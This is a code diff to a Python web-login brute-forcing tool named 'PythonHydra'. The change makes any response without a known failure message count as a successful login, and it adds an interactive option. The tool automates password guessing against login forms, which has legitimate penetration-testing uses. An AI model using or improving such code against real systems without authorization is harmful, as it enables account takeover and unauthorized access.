@@ -129,25 +129,14 @@ class PythonHydra:
             
             self.total_attempts += 1
             
-            # Check for success indicators
-            for indicator in success_indicators:
-                if indicator.lower() in response.text.lower():
-                    return True, f"Success indicator found: {indicator}"
-            
-            # Check for failure indicators
+            # Check for failure indicators FIRST (like your working code)
             for indicator in failure_indicators:
                 if indicator.lower() in response.text.lower():
                     return False, f"Failure indicator found: {indicator}"
             
-            # If no clear indicators, check HTTP status and response length
-            if response.status_code == 200:
-                # Check if response is significantly different (potential success)
-                if len(response.text) > 1000:  # Arbitrary threshold
-                    return True, "Potential success (large response)"
-                else:
-                    return False, "No clear success/failure indicators"
-            else:
-                return False, f"HTTP {response.status_code}"
+            # If no failure indicators found, it's likely a success
+            # This matches your working approach: "if 'Username or Password is invalid' not in response.text"
+            return True, "No failure indicators found (likely success)"
                 
         except requests.exceptions.RequestException as e:
             self.logger.warning(f"Request failed for {username}:{password} - {e}")
@@ -155,6 +144,8 @@ class PythonHydra:
         except Exception as e:
             self.logger.error(f"Unexpected error: {e}")
             return False, f"Error: {e}"
+    
+
     
     def brute_force(self, url: str, usernames: List[str], passwords: List[str],
                     form_data: Dict, success_indicators: List[str],
@@ -283,6 +274,7 @@ Examples:
     parser.add_argument('--delay', type=float, default=0.5, help='Delay between requests (seconds)')
     parser.add_argument('--threads', type=int, default=5, help='Number of threads')
     parser.add_argument('--stop-first', action='store_true', help='Stop on first successful login')
+    parser.add_argument('--interactive', '-i', action='store_true', help='Interactive mode to enter failure message')
     parser.add_argument('--verbose', '-v', action='store_true', help='Verbose output')
     
     args = parser.parse_args()
@@ -305,6 +297,7 @@ Examples:
         config['max_workers'] = args.threads
     if args.stop_first:
         config['stop_on_first'] = True
+
     
     # Validate required arguments
     if not args.target and 'target' not in config:
